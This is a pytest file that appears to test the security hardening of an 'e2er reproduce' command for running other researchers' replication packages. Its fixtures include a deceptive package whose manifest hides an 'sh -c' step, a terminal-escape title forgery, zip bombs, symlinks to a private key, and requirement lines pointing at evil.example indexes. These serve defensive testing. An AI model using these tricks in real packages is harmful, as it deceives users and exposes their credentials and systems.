"""`e2er reproduce` on someone else's package (security review 2026-10-23).

The reviewer's evil.e2er (tmp_sec/scripts/mkevil.py): a package whose manifest summary showed
one harmless step ("python run_estimation.py") while its reproduce.json ran ``sh -c`` and a
script that read ``~/.e2er/credentials.json``, wrote a file outside the run folder and opened a
raw socket past the network guard. ``e2er reproduce evil.e2er`` ran all of it at once, as the user.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import zipfile
from pathlib import Path
from typing import Any

import pytest

from src import cli_reproduce as cr
from src.cli_reproduce import reproduce
from src.core import reproduce as rp
from src.core import reproduce_sandbox as rs
from src.core.export import package as pkg
from src.core.safe_text import printable


def _study(tmp_path: Path, script: str, *, requirements: str = "# none\n", extra_steps: list | None = None) -> Path:
    folder = tmp_path / "study"
    (folder / "code").mkdir(parents=True)
    (folder / "results").mkdir()
    (folder / "code" / "run.py").write_text(script, encoding="utf-8")
    (folder / "code" / "requirements.txt").write_text(requirements, encoding="utf-8")
    (folder / "results" / "estimation_results.json").write_text('{"a": 1}', encoding="utf-8")
    recipe = {
        "schema": rp.SCHEMA,
        "requirements": "code/requirements.txt",
        "steps": [*(extra_steps or []), {"run": ["python", "code/run.py"]}],
        "compare": [{"published": "results/estimation_results.json", "produced": "estimation_results.json"}],
    }
    (folder / rp.RECIPE_FILE).write_text(json.dumps(recipe), encoding="utf-8")
    return folder


def _evil_package(tmp_path: Path, canary: Path) -> Path:
    """The reviewer's package: the summary says one python step, reproduce.json runs a shell first."""
    files = {
        "reproduce.json": json.dumps(
            {
                "schema": rp.SCHEMA,
                "requirements": "code/requirements.txt",
                "steps": [
                    {"run": ["sh", "-c", f"echo shell-step-ran > {canary}"]},
                    {"run": ["python", "code/run.py"]},
                ],
                "compare": [{"published": "results/estimation_results.json", "produced": "estimation_results.json"}],
            }
        ).encode(),
        "code/requirements.txt": b"",
        "code/run.py": f"open({str(canary)!r} + '.py', 'w').write('ran')\n".encode(),
        "results/estimation_results.json": b"{}",
    }
    contents = [{"path": p, "sha256": hashlib.sha256(b).hexdigest(), "bytes": len(b)} for p, b in files.items()]
    manifest = {
        "format": pkg.FORMAT,
        "contents": contents,
        "fingerprint": pkg.fingerprint(contents),
        "study": {"title": "A harmless study\x1b[2K\rTitle: Forged"},
        "recipe": {"present": True, "steps": [{"run": "python run_estimation.py"}]},
    }
    out = tmp_path / "evil.e2er"
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(pkg.MANIFEST, json.dumps(manifest))
        for p, b in files.items():
            zf.writestr(p, b)
    return out


# ── nothing runs before the researcher says so ───────────────────────────────


def test_without_a_terminal_and_without_yes_nothing_runs(tmp_path, capsys, monkeypatch):
    canary = tmp_path / "CANARY"
    monkeypatch.setattr(rs, "available", lambda runner=None: ("docker", ""))
    monkeypatch.setattr(cr, "_interactive", lambda: False)
    assert reproduce(str(_evil_package(tmp_path, canary))) == 2
    out = capsys.readouterr().out
    assert not canary.exists() and not Path(str(canary) + ".py").exists()
    # The exact commands of the archive's reproduce.json are listed, not the manifest's summary.
    assert f"1. sh -c 'echo shell-step-ran > {canary}'" in out
    assert "2. python code/run.py" in out
    assert "the author's code" in out and "Nothing was run" in out
    assert "\x1b" not in out


def test_a_no_at_the_question_runs_nothing(tmp_path, capsys, monkeypatch):
    canary = tmp_path / "CANARY"
    monkeypatch.setattr(rs, "available", lambda runner=None: ("docker", ""))
    monkeypatch.setattr(cr, "_interactive", lambda: True)
    asked: list[str] = []
    monkeypatch.setattr("builtins.input", lambda q: asked.append(q) or "n")
    assert reproduce(str(_evil_package(tmp_path, canary))) == 2
    assert asked == ["Run them? [y/N] "]
    assert not canary.exists()


def test_without_docker_nothing_runs_unless_no_sandbox(tmp_path, capsys, monkeypatch):
    canary = tmp_path / "CANARY"
    monkeypatch.setattr(rs, "available", lambda runner=None: (None, "Docker is not installed"))
    assert reproduce(str(_evil_package(tmp_path, canary)), yes=True) == 2
    out = capsys.readouterr().out
    assert "Docker is not installed" in out and "--no-sandbox" in out
    assert not canary.exists()


def test_the_reload_steps_ask_on_their_own(tmp_path, monkeypatch):
    folder = _study(tmp_path, "print(1)\n")
    recipe = json.loads((folder / rp.RECIPE_FILE).read_text())
    (folder / "code" / "get_data.py").write_text("print('load')\n")
    recipe["steps"].insert(0, {"run": ["python", "code/get_data.py"]})
    recipe["inputs"] = [{"path": "data/x.csv", "sha256": "0" * 64, "reload": "get_data.py"}]
    (folder / rp.RECIPE_FILE).write_text(json.dumps(recipe))
    monkeypatch.setattr(rs, "available", lambda runner=None: (None, "no docker"))
    monkeypatch.setattr(cr, "_interactive", lambda: True)
    answers = iter(["y", "n"])
    asked: list[str] = []
    monkeypatch.setattr("builtins.input", lambda q: asked.append(q) or next(answers))
    seen: dict[str, Any] = {}

    def fake_run_in(root, recipe, run_dir, **kw):
        seen.update(kw)
        return 0

    monkeypatch.setattr(cr, "_run_in", fake_run_in)
    assert reproduce(str(folder), sandbox=False) == 0
    assert asked[0] == "Run them? [y/N] " and "load inputs from the web" in asked[1]
    assert seen["allow_reload"] is False and seen["docker"] is None


# ── what is refused before anything runs ─────────────────────────────────────


@pytest.mark.parametrize(
    "line",
    [
        "--index-url https://evil.example/simple",
        "--extra-index-url https://evil.example/simple",
        "-i https://evil.example/simple",
        "-f https://evil.example/wheels",
        "--trusted-host evil.example",
        "-e git+https://evil.example/x.git#egg=x",
        "-r other.txt",
        "-c constraints.txt",
        "pandas @ https://evil.example/pandas.whl",
        "git+https://evil.example/x.git",
        "https://evil.example/x.tar.gz",
        "./local_pkg",
        "/abs/pkg",
        "numpy==1.26.4 --index-url=https://evil.example",
    ],
)
def test_installer_options_and_url_requirements_are_refused(tmp_path, line):
    req = tmp_path / "r.txt"
    req.write_text(f"numpy==1.26.4\n{line}\n")
    assert rp.requirements_problems(req), line


def test_a_hashed_lock_and_plain_pins_pass(tmp_path):
    req = tmp_path / "r.txt"
    req.write_text(
        "# a lock\n"
        "numpy==1.26.4 \\\n    --hash=sha256:" + "a" * 64 + " \\\n    --hash=sha256:" + "b" * 64 + "\n"
        "pandas[excel]>=2.0,<3 ; python_version >= '3.10'\n"
        "scipy~=1.11\n"
    )
    assert rp.requirements_problems(req) == []
    assert rp.requirement_lines(req) == [
        "numpy==1.26.4",
        "pandas[excel]>=2.0,<3 ; python_version >= '3.10'",
        "scipy~=1.11",
    ]


def test_a_symbolic_link_in_the_study_folder_is_refused(tmp_path, capsys):
    secret = tmp_path / "outside" / "id_rsa"
    secret.parent.mkdir()
    secret.write_text("PRIVATE")
    folder = _study(tmp_path, "print(1)\n")
    (folder / "code" / "key").symlink_to(secret)
    assert reproduce(str(folder), yes=True, sandbox=False) == 2
    out = capsys.readouterr().out
    assert "symbolic links (code/key)" in out


def test_the_install_on_this_computer_uses_wheels_only(tmp_path, monkeypatch):
    seen: list[list[str]] = []

    def fake_run(argv, **kw):
        seen.append(list(argv))
        return 1, "stop"

    monkeypatch.setattr(rp, "_run", fake_run)
    folder = _study(tmp_path, "print(1)\n")
    recipe = rp.load_recipe(folder)
    run = tmp_path / "run"
    run.mkdir()
    (run / ".e2er-logs").mkdir()
    monkeypatch.setattr(
        rp,
        "_run",
        lambda argv, **kw: (
            (seen.append(list(argv)) or (0, "")) if "venv" in argv else (seen.append(list(argv)) or (1, "x"))
        ),
    )
    with pytest.raises(rp.RecipeError):
        rp.make_environment(run, recipe, folder, run / ".e2er-logs")
    install = [a for a in seen if "install" in a][0]
    assert ("--only-binary" in install and ":all:" in install) or "--only-binary=:all:" in install


# ── the steps' environment on this computer (--no-sandbox) ───────────────────


def test_the_steps_get_an_empty_home_and_no_credentials(tmp_path, monkeypatch):
    for k, v in {
        "ANTHROPIC_API_KEY": "sk-ant-FAKE",
        "GITHUB_TOKEN": "ghp_FAKE",
        "E2ER_SESSION_TOKEN": "session-FAKE",
        "SSH_AUTH_SOCK": "/tmp/agent.sock",
        "DATABASE_URL": "postgresql://u:pw@db/x",
        "HTTPS_PROXY": "http://user:pass@proxy:3128",
        "HTTP_PROXY": "http://proxy:3128",
        "XDG_CONFIG_HOME": str(tmp_path / "cfg"),
        "HOME": str(tmp_path / "realhome"),
    }.items():
        monkeypatch.setenv(k, v)
    run = tmp_path / "e2er-reproduce-x"
    run.mkdir()
    env = rp.step_env(Path("/venv/bin/python"), run)
    home = str(run / ".e2er-home")
    assert env["HOME"] == home and env["XDG_CONFIG_HOME"] == home and env["XDG_CACHE_HOME"] == home
    assert env["E2ER_PROJECT_DIR"] == home
    for gone in (
        "ANTHROPIC_API_KEY",
        "GITHUB_TOKEN",
        "E2ER_SESSION_TOKEN",
        "SSH_AUTH_SOCK",
        "DATABASE_URL",
        "HTTPS_PROXY",
    ):
        assert gone not in env, gone
    assert env["HTTP_PROXY"] == "http://proxy:3128"
    assert not any(Path(home).iterdir())


def test_no_sandbox_steps_cannot_read_the_users_e2er_credentials(tmp_path, monkeypatch, capsys):
    real_home = tmp_path / "realhome"
    (real_home / ".e2er").mkdir(parents=True)
    (real_home / ".e2er" / "credentials.json").write_text('{"token": "e2er_FAKE"}')
    monkeypatch.setenv("HOME", str(real_home))
    script = (
        "import json, os\n"
        "p = os.path.expanduser('~/.e2er/credentials.json')\n"
        "out = {'a': 1, 'home': os.environ['HOME'], 'seen': os.path.exists(p)}\n"
        "json.dump(out, open('estimation_results.json', 'w'))\n"
    )
    folder = _study(tmp_path, script)
    (folder / "results" / "estimation_results.json").write_text('{"a": 1, "seen": false}')
    reproduce(str(folder), yes=True, sandbox=False, keep=True)
    out = capsys.readouterr().out
    run = Path(out.split("The run folder is kept: ")[1].split()[0])
    produced = json.loads((run / "estimation_results.json").read_text())
    shutil.rmtree(run, ignore_errors=True)
    assert produced["seen"] is False and produced["home"].endswith(".e2er-home")


# ── the Docker sandbox (a fake docker: the argv is the contract) ─────────────


class FakeDocker:
    def __init__(self) -> None:
        self.calls: list[list[str]] = []

    def __call__(self, argv, **kw):
        self.calls.append(list(argv))
        out = b""
        if "info" in argv:
            out = b"27.0.0"
        if "sh" in argv and "-c" in argv:
            out = b"E2ER-INSTALLED-BEGIN\nnumpy==1.26.4\nE2ER-INSTALLED-END\nE2ER-PYTHON 3.12.7\n"
        rc = 1 if argv[1:3] == ["image", "inspect"] else 0
        return subprocess.CompletedProcess(argv, rc, out, b"")


def test_the_sandbox_runs_each_step_in_a_locked_container(tmp_path, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-FAKE")
    folder = _study(tmp_path, "print(1)\n", requirements="numpy==1.26.4\n")
    (folder / "code" / "get_data.py").write_text("print('load')\n")
    recipe = rp.load_recipe(folder)
    recipe["steps"].insert(0, {"run": ["python", "code/get_data.py"]})
    recipe["inputs"] = [{"path": "data/x.csv", "sha256": "0" * 64, "reload": "get_data.py"}]
    run = tmp_path / "e2er-reproduce-r"
    (run / ".e2er-logs").mkdir(parents=True)
    docker = FakeDocker()
    box, info = rs.prepare(run, recipe, folder, run / ".e2er-logs", docker="docker", runner=docker)
    assert info["packages"] == {"numpy": "1.26.4"} and "Docker sandbox" in info["installer"]
    install = next(c for c in docker.calls if c[:2] == ["docker", "run"])
    mounts = [install[i + 1] for i, a in enumerate(install) if a == "--mount"]
    assert all("readonly" in m for m in mounts) and not any(str(folder / "code" / "run.py") in m for m in mounts)
    assert any("/e2er-install/requirements.txt" in m for m in mounts)
    script = install[-1]
    assert "--only-binary=:all:" in script and "/opt/e2er-venv" not in script  # the study uses no e2er-data

    docker.calls.clear()
    steps = rp.run_steps(
        run, recipe, rs.step_env(box, run), run / ".e2er-logs", f"{rs.STUDY_VENV}/bin/python",
        runner=rs.step_runner(box, run, runner=docker), log_path=lambda p: rs.in_box(p, run),
    )  # fmt: skip
    assert [s.exit_code for s in steps] == [0, 0]
    reload_step, estimation = docker.calls
    for argv in (reload_step, estimation):
        assert "--read-only" in argv and "--cap-drop=ALL" in argv and "--security-opt=no-new-privileges" in argv
        user = argv[argv.index("--user") + 1]
        assert not user.startswith("0:") and user != "0"
        mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "--mount"]
        assert mounts == [f"type=bind,source={run.resolve()},target=/work/run"]
        envs = [argv[i + 1] for i, a in enumerate(argv) if a == "-e"]
        assert "HOME=/tmp" in envs and not any("ANTHROPIC" in e or "TOKEN" in e for e in envs)
        assert f"{rs.STUDY_VENV}/bin/python" in argv
    assert reload_step[reload_step.index("--network") + 1] == "bridge"
    assert estimation[estimation.index("--network") + 1] == "none"
    assert "E2ER_REPRODUCE_NETWORK_LOG=/work/run/.e2er-logs/step-2-network.jsonl" in estimation


def test_a_declined_reload_step_gets_no_network_in_the_sandbox(tmp_path):
    folder = _study(tmp_path, "print(1)\n")
    (folder / "code" / "get_data.py").write_text("print('load')\n")
    recipe = rp.load_recipe(folder)
    recipe["steps"].insert(0, {"run": ["python", "code/get_data.py"]})
    recipe["inputs"] = [{"path": "data/x.csv", "sha256": "0" * 64, "reload": "get_data.py"}]
    run = tmp_path / "e2er-reproduce-d"
    (run / ".e2er-logs").mkdir(parents=True)
    docker = FakeDocker()
    box, _ = rs.prepare(run, recipe, folder, run / ".e2er-logs", docker="docker", runner=docker)
    docker.calls.clear()
    rp.run_steps(
        run, recipe, rs.step_env(box, run), run / ".e2er-logs", "python", allow_reload=False,
        runner=rs.step_runner(box, run, runner=docker), log_path=lambda p: rs.in_box(p, run),
    )  # fmt: skip
    assert [c[c.index("--network") + 1] for c in docker.calls] == ["none", "none"]


def _docker_answers() -> bool:
    docker, _ = rs.available()
    return docker is not None


@pytest.mark.skipif(not _docker_answers(), reason="needs a running Docker (CI's ubuntu runners have one)")
def test_a_real_sandbox_run_has_no_network_and_no_home(tmp_path, capsys):
    script = (
        "import json, os, socket\n"
        "try:\n"
        "    socket.create_connection(('1.1.1.1', 80), timeout=3); net = True\n"
        "except OSError:\n"
        "    net = False\n"
        "json.dump({'a': 1, 'net': net, 'home': os.environ['HOME'], 'root': os.getuid() == 0},"
        " open('estimation_results.json', 'w'))\n"
    )
    folder = _study(tmp_path, script)
    (folder / "results" / "estimation_results.json").write_text('{"a": 1, "net": false, "home": "/tmp", "root": false}')
    assert reproduce(str(folder), yes=True, sandbox=True) == 0, capsys.readouterr().out


# ── packages: zip bombs, inspect, terminal control sequences ─────────────────


def _package(path: Path, files: dict[str, bytes], manifest_extra: dict | None = None) -> Path:
    contents = [{"path": p, "sha256": hashlib.sha256(b).hexdigest(), "bytes": len(b)} for p, b in files.items()]
    m = {"format": pkg.FORMAT, "contents": contents, "fingerprint": pkg.fingerprint(contents), **(manifest_extra or {})}
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr(pkg.MANIFEST, json.dumps(m))
        for p, b in files.items():
            zf.writestr(p, b)
    return path


def test_many_small_bombs_are_refused_as_a_whole(tmp_path):
    """The reviewer's bypass: N files of exactly 1 MiB of zeros passed the per-file ratio check."""
    bomb = _package(tmp_path / "bomb.e2er", {f"d/{i}.bin": b"\0" * (1 << 20) for i in range(80)})
    with pytest.raises(pkg.PackageError, match="times its packed size"):
        pkg.open_package(bomb, tmp_path / "out")
    assert not (tmp_path / "out").exists()


def test_the_total_and_the_free_disk_are_checked(tmp_path, monkeypatch):
    ok = _package(tmp_path / "ok.e2er", {"a.bin": os.urandom(4096)})
    with pytest.raises(pkg.PackageError, match="unpacks to more than"):
        pkg.open_package(ok, tmp_path / "o1", max_total=1000)
    assert pkg.MAX_TOTAL_BYTES <= 8 * 1024**3 or "E2ER_PACKAGE_MAX_BYTES" in os.environ
    usage = shutil.disk_usage(tmp_path)
    monkeypatch.setattr(pkg.shutil, "disk_usage", lambda p: usage._replace(free=1024))
    with pytest.raises(pkg.PackageError, match="free"):
        pkg.open_package(ok, tmp_path / "o2")


def test_inspect_shows_the_archives_commands_and_no_control_sequences(tmp_path, capsys):
    from src.cli_package import inspect

    evil = _evil_package(tmp_path, tmp_path / "CANARY")
    assert inspect(str(evil)) == 0
    out = capsys.readouterr().out
    assert "1. sh -c" in out and "2. python code/run.py" in out
    assert "\x1b" not in out and "\r" not in out
    assert "Title: A harmless study[2K" not in out and "A harmless studyTitle: Forged" in out


def test_inspect_does_not_crash_on_a_malformed_author_list(tmp_path, capsys):
    from src.cli_package import inspect

    crash = _package(tmp_path / "crash.e2er", {"a.txt": b"hi"}, {"study": {"authors": [1, 2]}})
    assert inspect(str(crash)) == 0
    assert "Authors: 1, 2" in capsys.readouterr().out


def test_printable_drops_escapes_carriage_returns_and_bidi():
    assert printable("Harmless\x1b[2K\rTitle: Forged") == "HarmlessTitle: Forged"
    assert printable("a\x1b]8;;https://evil/\x07link\x1b]8;;\x07b") == "alinkb"
    assert printable("x‮exe.txt") == "xexe.txt"
    assert printable("two\nlines\tok") == "two\nlines\tok"
    assert printable("two\nlines", newlines=False) == "two lines"


def test_a_docker_daemon_that_is_down_is_not_taken_for_up(monkeypatch):
    """`docker info --format '{{.ServerVersion}}'` exits 0 with an empty version when the daemon is down."""
    monkeypatch.setattr(rs, "docker_binary", lambda: "docker")
    down = lambda argv, **kw: subprocess.CompletedProcess(argv, 0, b"\n", b"Cannot connect to the Docker daemon")  # noqa: E731
    assert rs.available(down) == (None, "Docker is not running (docker info failed); start Docker Desktop, then resume")
    up = lambda argv, **kw: subprocess.CompletedProcess(argv, 0, b"27.0.0\n", b"")  # noqa: E731
    assert rs.available(up) == ("docker", "")


def test_verify_and_inspect_output_passes_through_the_filter(capsys):
    import sys

    from src.core.safe_text import printable_output

    with printable_output():
        print("Title: x\x1b[2K\rForged")
        print("err\x1b]8;;https://evil/\x07", file=sys.stderr)
    out, err = capsys.readouterr()
    assert out == "Title: xForged\n" and err == "err\n"
